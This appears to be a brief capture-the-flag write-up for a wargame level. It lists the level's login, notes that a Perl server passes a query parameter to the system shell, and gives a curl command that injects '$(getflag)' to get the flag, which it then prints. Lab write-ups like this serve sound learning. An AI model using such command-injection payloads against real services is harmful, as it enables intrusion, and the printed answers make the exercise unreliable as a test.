username: level04  
password: qi0maab88jeaj46qoumi7maus
---

A perl server is running on localhost:4747, it accepts a query parameter `x` and echo it's value to standard output using the system shell.

Executing the following command outputs the flag.

```
curl 'localhost:4747?x=$(getflag)'
```

The flag is: ne2searoevaevoem4ov4ar8ap
